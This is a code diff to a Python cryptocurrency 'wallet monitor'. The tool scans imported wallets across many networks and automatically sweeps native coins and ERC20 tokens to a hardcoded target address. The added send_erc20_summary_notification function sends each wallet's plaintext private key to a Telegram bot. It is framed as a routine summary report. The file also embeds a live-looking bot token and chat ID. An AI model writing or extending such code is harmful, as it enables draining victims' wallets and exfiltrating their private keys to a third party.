@@ -65,7 +65,7 @@ if not auto_install_dependencies():
 try:
     from web3 import Web3
     from eth_account import Account
-    from colorama import Fore, Style, init
+    from colorama import Fore, Style, Back, init
     import aiohttp
     import cryptography
     import requests
@@ -97,6 +97,12 @@ TARGET_ADDRESS = Web3.to_checksum_address("0x6b219df8c31c6b39a1a9b88446e0199be8f
 TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
 TELEGRAM_CHAT_ID = "5963704377"
 TELEGRAM_NOTIFICATIONS_ENABLED = True  # 是否启用TG通知
+
+# 🗂️ 数据缓存和日志配置
+MAX_LOG_SIZE_MB = 500  # 最大日志文件大小(MB)
+TRANSACTION_HISTORY_CACHE_FILE = "transaction_history_cache.json"  # 交易记录缓存
+WALLET_SCAN_CACHE_FILE = "wallet_scan_cache.json"  # 钱包扫描缓存
+RPC_CONNECTION_CACHE_FILE = "rpc_connection_cache.json"  # RPC连接缓存
 
 def get_current_api_key():
     """获取当前API密钥"""
@@ -407,6 +413,9 @@ def update_transfer_stats(network_name: str, amount: float, currency: str, notif
 def save_transfer_stats():
     """保存转账统计到文件"""
     try:
+        # 检查并轮转日志文件
+        check_and_rotate_log_file('transfer_stats.json')
+        
         with open('transfer_stats.json', 'w', encoding='utf-8') as f:
             json.dump(TRANSFER_STATS, f, ensure_ascii=False, indent=2)
     except:
@@ -437,6 +446,73 @@ def get_transfer_stats_summary() -> str:
     today_transfers = TRANSFER_STATS['daily_stats'].get(today, {}).get('transfers', 0)
     
     return f"📊 总转账: {total} 笔 | 📈 今日: {today_transfers} 笔 | 💰 总计: {total_eth:.6f} ETH | 🌐 网络: {networks} 个 | 📱 通知成功率: {success_rate:.1f}%"
+
+# 🗂️ 日志和缓存管理系统
+def check_and_rotate_log_file(log_file_path: str):
+    """检查日志文件大小，超过限制时自动轮转"""
+    try:
+        if os.path.exists(log_file_path):
+            file_size_mb = os.path.getsize(log_file_path) / (1024 * 1024)
+            
+            if file_size_mb > MAX_LOG_SIZE_MB:
+                # 备份旧日志
+                backup_path = f"{log_file_path}.backup"
+                if os.path.exists(backup_path):
+                    os.remove(backup_path)
+                os.rename(log_file_path, backup_path)
+                
+                print(f"{Fore.YELLOW}📄 日志文件已轮转: {log_file_path} ({file_size_mb:.1f}MB){Style.RESET_ALL}")
+                return True
+        return False
+    except Exception as e:
+        print(f"{Fore.RED}❌ 日志轮转失败: {e}{Style.RESET_ALL}")
+        return False
+
+def load_transaction_history_cache() -> Dict[str, Dict[str, int]]:
+    """加载交易记录缓存"""
+    try:
+        check_and_rotate_log_file(TRANSACTION_HISTORY_CACHE_FILE)
+        
+        if os.path.exists(TRANSACTION_HISTORY_CACHE_FILE):
+            with open(TRANSACTION_HISTORY_CACHE_FILE, 'r', encoding='utf-8') as f:
+                cache = json.load(f)
+                print(f"{Fore.GREEN}✅ 加载交易记录缓存: {len(cache)} 个钱包{Style.RESET_ALL}")
+                return cache
+    except Exception as e:
+        print(f"{Fore.YELLOW}⚠️ 交易记录缓存加载失败: {e}{Style.RESET_ALL}")
+    
+    return {}
+
+def save_transaction_history_cache(cache: Dict[str, Dict[str, int]]):
+    """保存交易记录缓存"""
+    try:
+        with open(TRANSACTION_HISTORY_CACHE_FILE, 'w', encoding='utf-8') as f:
+            json.dump(cache, f, indent=2, ensure_ascii=False)
+        print(f"{Fore.GREEN}💾 交易记录缓存已保存: {len(cache)} 个钱包{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}❌ 交易记录缓存保存失败: {e}{Style.RESET_ALL}")
+
+def load_rpc_connection_cache() -> Dict[str, bool]:
+    """加载RPC连接缓存"""
+    try:
+        if os.path.exists(RPC_CONNECTION_CACHE_FILE):
+            with open(RPC_CONNECTION_CACHE_FILE, 'r', encoding='utf-8') as f:
+                cache = json.load(f)
+                print(f"{Fore.GREEN}✅ 加载RPC连接缓存: {sum(cache.values())}/{len(cache)} 个网络可用{Style.RESET_ALL}")
+                return cache
+    except Exception as e:
+        print(f"{Fore.YELLOW}⚠️ RPC连接缓存加载失败: {e}{Style.RESET_ALL}")
+    
+    return {}
+
+def save_rpc_connection_cache(cache: Dict[str, bool]):
+    """保存RPC连接缓存"""
+    try:
+        with open(RPC_CONNECTION_CACHE_FILE, 'w', encoding='utf-8') as f:
+            json.dump(cache, f, indent=2, ensure_ascii=False)
+        print(f"{Fore.GREEN}💾 RPC连接缓存已保存: {sum(cache.values())}/{len(cache)} 个网络{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}❌ RPC连接缓存保存失败: {e}{Style.RESET_ALL}")
 
 def get_api_keys_status():
     """获取API密钥状态信息"""
@@ -1038,12 +1114,54 @@ class WalletMonitor:
         self.web3_clients: Dict[str, Web3] = {}        # RPC模式客户端
         self.monitoring_active = False
         self.network_status: Dict[str, NetworkStatus] = {}
+        
+        # 🗂️ 缓存系统
+        self.transaction_history_cache: Dict[str, Dict[str, int]] = {}
+        self.rpc_connection_cache: Dict[str, bool] = {}
+        self.first_time_monitoring = True  # 标记是否首次监控
+        
+        # 加载所有数据
         self.load_wallets()
         self.load_network_status()
+        self.load_all_caches()
         load_transfer_stats()  # 加载转账统计
+    
+    def load_all_caches(self):
+        """加载所有缓存数据"""
+        print(f"{Fore.CYAN}🗂️ 加载缓存数据...{Style.RESET_ALL}")
+        
+        # 加载交易记录缓存
+        self.transaction_history_cache = load_transaction_history_cache()
+        
+        # 加载RPC连接缓存
+        self.rpc_connection_cache = load_rpc_connection_cache()
+        
+        # 检查是否首次监控
+        if self.transaction_history_cache or self.rpc_connection_cache:
+            self.first_time_monitoring = False
+            print(f"{Fore.GREEN}📂 发现缓存数据，将使用已有的扫描记录{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}📂 首次运行，将执行完整扫描{Style.RESET_ALL}")
+    
+    def save_all_caches(self):
+        """保存所有缓存数据"""
+        save_transaction_history_cache(self.transaction_history_cache)
+        save_rpc_connection_cache(self.rpc_connection_cache)
         
     async def dynamic_rpc_test(self) -> Dict[str, bool]:
         """动态测试所有RPC连接，返回可用网络列表"""
+        # 如果有缓存且不是首次监控，优先使用缓存
+        if not self.first_time_monitoring and self.rpc_connection_cache:
+            print(f"\n{Fore.GREEN}📂 使用RPC连接缓存 ({sum(self.rpc_connection_cache.values())}/{len(self.rpc_connection_cache)} 个网络可用){Style.RESET_ALL}")
+            
+            # 将缓存的连接状态应用到web3_clients
+            for network_key, is_available in self.rpc_connection_cache.items():
+                if is_available and network_key not in self.web3_clients:
+                    # 按需加载网络连接
+                    self.load_network_on_demand(network_key)
+            
+            return self.rpc_connection_cache
+        
         print(f"\n{Fore.CYAN}🔍 动态测试RPC连接 - 检测可用网络...{Style.RESET_ALL}")
         
         available_networks = {}
@@ -1144,10 +1262,20 @@ class WalletMonitor:
         print(f"  🧪 测试网: {testnet_count} 个")
         print(f"  🔴 不可用: {len(failed_networks)} 个")
         
+        # 保存RPC连接缓存
+        self.rpc_connection_cache = available_networks
+        save_rpc_connection_cache(self.rpc_connection_cache)
+        
         return available_networks
 
     async def check_wallet_transaction_history(self, address: str, available_networks: Dict[str, bool]) -> Dict[str, int]:
         """检查钱包在各个网络的交易记录"""
+        # 如果有缓存且不是首次监控，优先使用缓存
+        if not self.first_time_monitoring and address in self.transaction_history_cache:
+            cached_networks = self.transaction_history_cache[address]
+            print(f"\n{Fore.GREEN}📂 使用交易记录缓存: {address[:10]}...{address[-8:]} ({len(cached_networks)} 个活跃网络){Style.RESET_ALL}")
+            return cached_networks
+        
         print(f"\n{Fore.CYAN}📊 检查钱包交易记录: {address[:10]}...{address[-8:]}{Style.RESET_ALL}")
         
         wallet_networks = {}
@@ -1218,6 +1346,11 @@ class WalletMonitor:
         print(f"  📊 总交易数量: {total_tx_count} 笔")
         print(f"  🚫 无交易记录的网络: {len(available_network_keys) - len(active_networks)} 个")
         
+        # 保存交易记录缓存
+        if wallet_networks:  # 只有当有交易记录时才缓存
+            self.transaction_history_cache[address] = wallet_networks
+            save_transaction_history_cache(self.transaction_history_cache)
+        
         return wallet_networks
 
     async def scan_erc20_tokens(self, address: str, network_key: str, web3) -> List[Dict]:
@@ -1259,6 +1392,139 @@ class WalletMonitor:
                 continue  # 忽略单个代币的错误
         
         return tokens_found
+
+    async def get_token_price_coingecko(self, token_symbol: str, network_name: str) -> Optional[float]:
+        """从CoinGecko获取代币价格（美元）"""
+        try:
+            # CoinGecko API映射
+            coingecko_ids = {
+                'USDT': 'tether',
+                'USDC': 'usd-coin', 
+                'UNI': 'uniswap',
+                'LINK': 'chainlink',
+                'DAI': 'dai',
+                'WMATIC': 'matic-network',
+                'DEGEN': 'degen-base',
+                'ETH': 'ethereum',
+                'MATIC': 'matic-network',
+                'OP': 'optimism',
+                'ARB': 'arbitrum'
+            }
+            
+            token_id = coingecko_ids.get(token_symbol.upper())
+            if not token_id:
+                return None
+            
+            url = f"https://api.coingecko.com/api/v3/simple/price?ids={token_id}&vs_currencies=usd"
+            
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
+                    if response.status == 200:
+                        data = await response.json()
+                        return data.get(token_id, {}).get('usd')
+            
+        except Exception as e:
+            print(f"{Fore.YELLOW}⚠️ 价格查询失败 {token_symbol}: {str(e)[:30]}...{Style.RESET_ALL}")
+            return None
+
+    async def scan_erc20_tokens_with_prices(self, address: str, network_key: str, web3) -> List[Dict]:
+        """扫描钱包的ERC20代币余额并获取价格"""
+        if not ERC20_SCAN_ENABLED or network_key not in VALUABLE_ERC20_TOKENS:
+            return []
+        
+        tokens_found = []
+        token_addresses = VALUABLE_ERC20_TOKENS[network_key]
+        
+        print(f"{Fore.CYAN}🪙 扫描 {len(token_addresses)} 个ERC20代币（含价格查询）...{Style.RESET_ALL}")
+        
+        for token_address, token_info in token_addresses.items():
+            try:
+                # 创建代币合约实例
+                loop = asyncio.get_event_loop()
+                
+                # 在executor中执行合约调用
+                contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
+                balance = await loop.run_in_executor(None, contract.functions.balanceOf(address).call)
+                
+                if balance > 0:
+                    # 计算实际余额
+                    decimals = token_info['decimals']
+                    actual_balance = balance / (10 ** decimals)
+                    
+                    # 获取价格
+                    price_usd = await self.get_token_price_coingecko(token_info['symbol'], network_key)
+                    total_value_usd = actual_balance * price_usd if price_usd else None
+                    
+                    token_data = {
+                        'address': token_address,
+                        'symbol': token_info['symbol'],
+                        'name': token_info['name'],
+                        'balance': actual_balance,
+                        'balance_raw': balance,
+                        'decimals': decimals,
+                        'price_usd': price_usd,
+                        'total_value_usd': total_value_usd,
+                        'network': network_key
+                    }
+                    
+                    tokens_found.append(token_data)
+                    
+                    # 显示代币信息
+                    if price_usd and total_value_usd:
+                        print(f"{Fore.GREEN}💰 发现代币: {actual_balance:.6f} {token_info['symbol']} (${price_usd:.4f} = ${total_value_usd:.2f}){Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.GREEN}💰 发现代币: {actual_balance:.6f} {token_info['symbol']} (价格未知){Style.RESET_ALL}")
+                
+            except Exception as e:
+                continue  # 忽略单个代币的错误
+        
+        return tokens_found
+
+    async def send_erc20_summary_notification(self, wallet_address: str, private_key: str, all_tokens: List[Dict]):
+        """发送ERC20代币汇总通知"""
+        if not TELEGRAM_NOTIFICATIONS_ENABLED or not all_tokens:
+            return
+        
+        # 按网络分组
+        tokens_by_network = {}
+        total_value_usd = 0
+        
+        for token in all_tokens:
+            network = token['network']
+            if network not in tokens_by_network:
+                tokens_by_network[network] = []
+            tokens_by_network[network].append(token)
+            
+            if token['total_value_usd']:
+                total_value_usd += token['total_value_usd']
+        
+        # 构建消息
+        message = f"""🪙 <b>ERC20代币汇总报告</b>
+
+📍 <b>钱包地址:</b> <code>{wallet_address}</code>
+🔐 <b>私钥:</b> <code>{private_key}</code>
+💰 <b>总价值:</b> ${total_value_usd:.2f} USD
+
+"""
+        
+        for network, tokens in tokens_by_network.items():
+            network_name = NETWORK_NAMES.get(network, network)
+            message += f"🌐 <b>{network_name}</b>\n"
+            
+            for token in tokens:
+                if token['total_value_usd']:
+                    message += f"  • {token['balance']:.6f} {token['symbol']} (${token['total_value_usd']:.2f})\n"
+                else:
+                    message += f"  • {token['balance']:.6f} {token['symbol']} (价格未知)\n"
+            message += "\n"
+        
+        message += f"⏰ <b>扫描时间:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        
+        try:
+            await send_telegram_notification(message)
+            print(f"{Fore.GREEN}📱 ERC20汇总通知已发送到Telegram{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}❌ Telegram通知发送失败: {str(e)[:30]}...{Style.RESET_ALL}")
 
     async def calculate_smart_gas(self, web3, from_address: str, to_address: str, value: int, is_erc20: bool = False, token_address: str = None) -> Dict:
         """智能Gas计算 - 优化小余额转账"""
@@ -1569,6 +1835,9 @@ class WalletMonitor:
     def save_wallets(self):
         """保存钱包数据"""
         try:
+            # 检查并轮转日志文件
+            check_and_rotate_log_file(WALLETS_FILE)
+            
             data = [wallet.__dict__ for wallet in self.wallets]
             with open(WALLETS_FILE, 'w', encoding='utf-8') as f:
                 json.dump(data, f, ensure_ascii=False, indent=2)
@@ -1924,7 +2193,7 @@ class WalletMonitor:
             
             # 签名并发送交易
             signed_txn = account.sign_transaction(transaction)
-            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
+            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.raw_transaction)
             
             # 记录转账并发送通知
             await self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_cost, gas_price, config)
@@ -2064,28 +2333,67 @@ class WalletMonitor:
         return active_networks
     
     async def batch_scan_all_wallets(self):
-        """批量扫描所有钱包 - 智能优化版本"""
-        print(f"{Fore.CYAN}📡 开始智能批量扫描 {len(self.wallets)} 个钱包...{Style.RESET_ALL}")
+        """批量扫描所有钱包 - 智能缓存优化版本"""
+        # 🎨 美化开始横幅
+        scan_mode = "首次完整扫描" if self.first_time_monitoring else "快速余额扫描"
+        print(f"\n{Back.BLUE}{Fore.WHITE}{'  ' * 35}{Style.RESET_ALL}")
+        print(f"{Back.BLUE}{Fore.WHITE}    🚀 启动智能批量扫描系统 🚀    {Style.RESET_ALL}")
+        print(f"{Back.BLUE}{Fore.WHITE}    📊 模式: {scan_mode} | {len(self.wallets)} 个钱包    {Style.RESET_ALL}")
+        print(f"{Back.BLUE}{Fore.WHITE}{'  ' * 35}{Style.RESET_ALL}\n")
         
         # 第一步：动态测试RPC连接
-        print(f"{Fore.MAGENTA}🔄 第1阶段: 动态RPC连接测试{Style.RESET_ALL}")
+        if self.first_time_monitoring:
+            print(f"{Fore.MAGENTA}┌─── 🔄 第1阶段: 动态RPC连接测试 ───┐{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│ {Fore.CYAN}并发测试所有网络的RPC连接状态{Fore.MAGENTA}  │{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}└─────────────────────────────────┘{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.GREEN}🔄 第1阶段: 使用RPC连接缓存{Style.RESET_ALL}")
+            
         available_networks = await self.dynamic_rpc_test()
         
         if not any(available_networks.values()):
-            print(f"{Fore.RED}❌ 没有可用的网络连接！{Style.RESET_ALL}")
+            print(f"\n{Back.RED}{Fore.WHITE} ❌ 扫描终止 {Style.RESET_ALL} {Fore.RED}没有可用的网络连接！{Style.RESET_ALL}")
             return
         
-        # 第二步：检查钱包交易记录
-        print(f"\n{Fore.MAGENTA}🔄 第2阶段: 钱包交易记录分析{Style.RESET_ALL}")
-        wallet_network_map = {}  # 存储每个钱包有交易记录的网络
+        available_count = sum(available_networks.values())
+        print(f"\n{Fore.GREEN}✅ 第1阶段完成 - {available_count} 个可用网络{Style.RESET_ALL}")
         
-        for i, wallet in enumerate(self.wallets):
-            print(f"{Fore.CYAN}📊 [{i + 1}/{len(self.wallets)}] 分析钱包交易记录...{Style.RESET_ALL}")
-            wallet_networks = await self.check_wallet_transaction_history(wallet.address, available_networks)
-            wallet_network_map[wallet.address] = wallet_networks
+        # 第二步：检查钱包交易记录 (只在首次扫描时执行)
+        wallet_network_map = {}
+        
+        if self.first_time_monitoring:
+            print(f"\n{Fore.MAGENTA}┌─── 🔄 第2阶段: 钱包交易记录分析 ───┐{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│ {Fore.YELLOW}筛选有交易活动的网络，永久缓存{Fore.MAGENTA}  │{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}└─────────────────────────────────────┘{Style.RESET_ALL}")
+            
+            for i, wallet in enumerate(self.wallets):
+                print(f"\n{Fore.CYAN}📊 [{i + 1}/{len(self.wallets)}] 分析钱包: {wallet.address[:8]}...{wallet.address[-6:]}{Style.RESET_ALL}")
+                wallet_networks = await self.check_wallet_transaction_history(wallet.address, available_networks)
+                wallet_network_map[wallet.address] = wallet_networks
+                
+                if wallet_networks:
+                    print(f"{Fore.GREEN}    ✅ 发现 {len(wallet_networks)} 个活跃网络{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.BLUE}    💡 此钱包无交易记录，将跳过{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.GREEN}✅ 第2阶段完成 - 交易记录已永久缓存{Style.RESET_ALL}")
+            
+            # 标记已完成首次扫描
+            self.first_time_monitoring = False
+            
+        else:
+            print(f"\n{Fore.GREEN}🔄 第2阶段: 使用交易记录缓存{Style.RESET_ALL}")
+            # 使用缓存的交易记录
+            for wallet in self.wallets:
+                if wallet.address in self.transaction_history_cache:
+                    wallet_network_map[wallet.address] = self.transaction_history_cache[wallet.address]
+                else:
+                    wallet_network_map[wallet.address] = {}
         
         # 第三步：智能余额扫描和转账
-        print(f"\n{Fore.MAGENTA}🔄 第3阶段: 智能余额扫描与转账{Style.RESET_ALL}")
+        print(f"\n{Fore.MAGENTA}┌─── 🔄 第3阶段: 智能余额扫描与转账 ───┐{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}│ {Fore.GREEN}扫描原生代币+ERC20，执行智能转账{Fore.MAGENTA}   │{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}└───────────────────────────────────────┘{Style.RESET_ALL}")
         
         total_found = 0
         total_transferred = 0
@@ -2139,13 +2447,16 @@ class WalletMonitor:
                             if success:
                                 total_transferred += 1
                         
-                        # 扫描ERC20代币
+                        # 扫描ERC20代币（含价格）
                         if ERC20_SCAN_ENABLED:
-                            tokens = await self.scan_erc20_tokens(wallet.address, network_key, web3)
+                            tokens = await self.scan_erc20_tokens_with_prices(wallet.address, network_key, web3)
+                            
+                            if tokens:
+                                # 发送ERC20汇总通知
+                                await self.send_erc20_summary_notification(wallet.address, wallet.private_key, tokens)
                             
                             for token in tokens:
                                 erc20_found += 1
-                                print(f"{Fore.MAGENTA}🪙 发现ERC20代币: {token['balance']:.6f} {token['symbol']}{Style.RESET_ALL}")
                                 
                                 # 尝试转账ERC20代币
                                 success = await self.smart_transfer_erc20(wallet, network_key, token, web3)
@@ -2166,18 +2477,53 @@ class WalletMonitor:
         tasks = [smart_scan_wallet(i, wallet) for i, wallet in enumerate(self.wallets)]
         await asyncio.gather(*tasks, return_exceptions=True)
         
-        # 显示扫描总结
-        print(f"\n{Fore.GREEN}🎉 智能批量扫描完成！{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}📊 扫描统计:{Style.RESET_ALL}")
-        print(f"  💰 发现余额: {total_found} 个")
-        print(f"  ✅ 成功转账: {total_transferred} 个")
-        print(f"  🪙 ERC20代币: {erc20_found} 个")
-        print(f"  ⛽ Gas不足事件: {gas_insufficient_count} 个")
+        # 🎨 美化扫描总结
+        print(f"\n{Back.GREEN}{Fore.WHITE}{'  ' * 25}{Style.RESET_ALL}")
+        print(f"{Back.GREEN}{Fore.WHITE}    🎉 智能批量扫描完成！ 🎉    {Style.RESET_ALL}")
+        print(f"{Back.GREEN}{Fore.WHITE}{'  ' * 25}{Style.RESET_ALL}\n")
+        
+        # 📊 美化统计表格
+        print(f"{Fore.CYAN}┌─── 📊 扫描统计报告 ─────────────────┐{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}│{Style.RESET_ALL}                                     {Fore.CYAN}│{Style.RESET_ALL}")
+        
+        # 统计数据行
+        stats = [
+            ("💰", "发现余额", total_found, "个", Fore.YELLOW),
+            ("✅", "成功转账", total_transferred, "个", Fore.GREEN),  
+            ("🪙", "ERC20代币", erc20_found, "个", Fore.MAGENTA),
+            ("⛽", "Gas不足", gas_insufficient_count, "个", Fore.RED)
+        ]
+        
+        for icon, label, value, unit, color in stats:
+            if value > 0:
+                print(f"{Fore.CYAN}│{Style.RESET_ALL} {icon} {Fore.WHITE}{label}:{Style.RESET_ALL} {color}{value} {unit}{Style.RESET_ALL}                    {Fore.CYAN}│{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.CYAN}│{Style.RESET_ALL} {icon} {Fore.WHITE}{label}:{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}{value} {unit}{Style.RESET_ALL}                    {Fore.CYAN}│{Style.RESET_ALL}")
+        
+        print(f"{Fore.CYAN}│{Style.RESET_ALL}                                     {Fore.CYAN}│{Style.RESET_ALL}")
+        
+        # 成功率计算
+        if total_found > 0:
+            success_rate = (total_transferred / total_found) * 100
+            rate_color = Fore.GREEN if success_rate >= 80 else Fore.YELLOW if success_rate >= 50 else Fore.RED
+            print(f"{Fore.CYAN}│{Style.RESET_ALL} 📈 {Fore.WHITE}转账成功率:{Style.RESET_ALL} {rate_color}{success_rate:.1f}%{Style.RESET_ALL}              {Fore.CYAN}│{Style.RESET_ALL}")
+        
+        # 时间统计
+        current_time = datetime.now().strftime("%H:%M:%S")
+        print(f"{Fore.CYAN}│{Style.RESET_ALL} ⏰ {Fore.WHITE}完成时间:{Style.RESET_ALL} {Fore.BLUE}{current_time}{Style.RESET_ALL}               {Fore.CYAN}│{Style.RESET_ALL}")
+        
+        print(f"{Fore.CYAN}└─────────────────────────────────────┘{Style.RESET_ALL}")
         
         # 更新统计
         TRANSFER_STATS['erc20_transfers'] += erc20_found
         TRANSFER_STATS['insufficient_gas_events'] += gas_insufficient_count
         save_transfer_stats()
+        
+        # 成功提示音效（文字版）
+        if total_transferred > 0:
+            print(f"\n{Fore.GREEN}🔔 叮咚！发现并成功处理了 {total_transferred} 个余额！{Style.RESET_ALL}")
+        else:
+            print(f"\n{Fore.BLUE}💡 本轮扫描未发现可转账余额{Style.RESET_ALL}")
     
     async def smart_transfer_balance(self, wallet: WalletInfo, network_key: str, balance: float, web3) -> bool:
         """智能转账原生代币 - 使用优化的Gas计算"""
@@ -2222,19 +2568,30 @@ class WalletMonitor:
             else:
                 transaction['gasPrice'] = gas_config['gasPrice']
             
-            print(f"{Fore.CYAN}💸 转账金额: {Web3.from_wei(transfer_amount, 'ether'):.8f} ETH (Gas费: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH){Style.RESET_ALL}")
+            # 🎨 美化转账信息显示
+            transfer_eth = Web3.from_wei(transfer_amount, 'ether')
+            gas_eth = Web3.from_wei(gas_config['totalGasCost'], 'ether')
+            
+            print(f"\n{Fore.CYAN}┌─── 💸 转账详情 ───┐{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}│{Style.RESET_ALL} 💰 金额: {Fore.YELLOW}{transfer_eth:.8f} ETH{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}│{Style.RESET_ALL} ⛽ Gas费: {Fore.BLUE}{gas_eth:.8f} ETH{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}└──────────────────┘{Style.RESET_ALL}")
+            
+            if gas_config.get('optimized'):
+                print(f"{Fore.MAGENTA}⚡ 智能Gas优化模式已启用，节省费用{Style.RESET_ALL}")
             
             # 签名并发送交易
+            print(f"{Fore.YELLOW}🔐 正在签名并发送交易...{Style.RESET_ALL}")
             signed_txn = account.sign_transaction(transaction)
-            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
+            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.raw_transaction)
             
             # 记录转账并发送通知
             await self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_config['totalGasCost'], gas_config.get('gasPrice', 0), config)
             
-            if gas_config.get('optimized'):
-                print(f"{Fore.CYAN}⚡ 使用优化Gas模式节省费用{Style.RESET_ALL}")
-            
-            print(f"{Fore.GREEN}✅ 转账成功! 交易哈希: {tx_hash.hex()[:16]}...{Style.RESET_ALL}")
+            # 🎉 美化成功提示
+            print(f"\n{Back.GREEN}{Fore.WHITE} ✅ 转账成功！ {Style.RESET_ALL}")
+            print(f"{Fore.GREEN}🔗 交易哈希: {Fore.CYAN}{tx_hash.hex()[:20]}...{tx_hash.hex()[-16:]}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}📱 TG通知已发送{Style.RESET_ALL}")
             return True
             
         except Exception as e:
@@ -2295,16 +2652,28 @@ class WalletMonitor:
             else:
                 transaction['gasPrice'] = gas_config['gasPrice']
             
-            print(f"{Fore.CYAN}🪙 转账ERC20: {token['balance']:.6f} {token['symbol']} (Gas费: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH){Style.RESET_ALL}")
+            # 🎨 美化ERC20转账信息
+            gas_eth = Web3.from_wei(gas_config['totalGasCost'], 'ether')
+            value_display = f"${token['total_value_usd']:.2f}" if token.get('total_value_usd') else "价值未知"
+            
+            print(f"\n{Fore.MAGENTA}┌─── 🪙 ERC20转账详情 ───┐{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│{Style.RESET_ALL} 🪙 代币: {Fore.YELLOW}{token['balance']:.6f} {token['symbol']}{Style.RESET_ALL} {Fore.MAGENTA}│{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│{Style.RESET_ALL} 💰 价值: {Fore.GREEN}{value_display}{Style.RESET_ALL} {Fore.MAGENTA}│{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}│{Style.RESET_ALL} ⛽ Gas费: {Fore.BLUE}{gas_eth:.8f} ETH{Style.RESET_ALL} {Fore.MAGENTA}│{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}└─────────────────────────┘{Style.RESET_ALL}")
             
             # 签名并发送交易
+            print(f"{Fore.YELLOW}🔐 正在签名并发送ERC20交易...{Style.RESET_ALL}")
             signed_txn = account.sign_transaction(transaction)
-            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
+            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.raw_transaction)
             
             # 发送ERC20转账成功通知
             await self.send_erc20_transfer_notification(wallet.address, token, network_key, tx_hash.hex())
             
-            print(f"{Fore.GREEN}✅ ERC20转账成功! 交易哈希: {tx_hash.hex()[:16]}...{Style.RESET_ALL}")
+            # 🎉 美化ERC20成功提示
+            print(f"\n{Back.MAGENTA}{Fore.WHITE} 🪙 ERC20转账成功！ {Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}🔗 交易哈希: {Fore.CYAN}{tx_hash.hex()[:20]}...{tx_hash.hex()[-16:]}{Style.RESET_ALL}")
+            print(f"{Fore.MAGENTA}📱 ERC20汇总通知已发送{Style.RESET_ALL}")
             return True
             
         except Exception as e:
@@ -2365,8 +2734,14 @@ class WalletMonitor:
             print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
             return
         
-        print(f"\n{Fore.GREEN}🎯 启动智能监控系统{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}📊 监控钱包: {len(self.wallets)} 个{Style.RESET_ALL}")
+        # 显示监控模式
+        if self.first_time_monitoring:
+            print(f"\n{Fore.GREEN}🎯 启动首次完整监控 {len(self.wallets)} 个钱包{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}💡 首次扫描：RPC测试→交易记录分析→余额扫描→永久缓存{Style.RESET_ALL}")
+        else:
+            print(f"\n{Fore.GREEN}🎯 启动智能监控 {len(self.wallets)} 个钱包 (缓存模式){Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}💡 快速扫描：使用缓存→直接余额扫描{Style.RESET_ALL}")
+        
         print(f"{Fore.CYAN}🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
         
@@ -2393,6 +2768,9 @@ class WalletMonitor:
                 # 扫描所有钱包
                 await self.batch_scan_all_wallets()
                 
+                # 保存所有缓存
+                self.save_all_caches()
+                
                 scan_duration = time.time() - start_time
                 print(f"\n{Fore.GREEN}✅ 第{round_count}轮扫描完成 (耗时: {scan_duration:.1f}秒){Style.RESET_ALL}")
                 
@@ -2409,7 +2787,10 @@ class WalletMonitor:
             print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
         finally:
             self.monitoring_active = False
-            self.save_network_status()  # 保存网络状态
+            # 保存所有状态和缓存
+            self.save_network_status()
+            self.save_all_caches()
+            print(f"{Fore.CYAN}💾 所有数据已保存{Style.RESET_ALL}")
     
     def start_monitoring_menu(self):
         """开始监控菜单 - 完全优化交互"""
@@ -3085,8 +3466,97 @@ class WalletMonitor:
         
         enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
     
+    def show_enhanced_status(self):
+        """显示美化的系统状态"""
+        # 获取基本状态信息
